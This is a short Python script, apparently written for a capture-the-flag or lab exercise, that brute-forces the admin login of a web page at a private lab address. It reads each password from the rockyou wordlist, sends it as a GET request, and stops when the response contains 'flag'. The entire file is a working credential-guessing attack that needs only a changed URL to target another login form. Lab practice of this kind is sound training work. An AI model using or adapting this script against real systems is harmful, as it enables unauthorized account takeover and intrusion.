import requests

URL = "http://192.168.56.101/index.php"
USERNAME = "admin"
WORDLIST_FILE = "rockyou.txt"

with open(WORDLIST_FILE, "r") as file:
    for line in file:
        password = line.strip()
        params = {
            "page": "signin",
            "username": USERNAME,
            "password": password,
            "Login": "Login"
        }

        try:
            response = requests.get(URL, params=params, timeout=5)

            if "flag" in response.text:
                print(f"Mot de passe trouvé : {password}")
                break
            else:
                print(f"Échec : {password}")

        except requests.RequestException as e:
            print(f"Erreur : {e}")
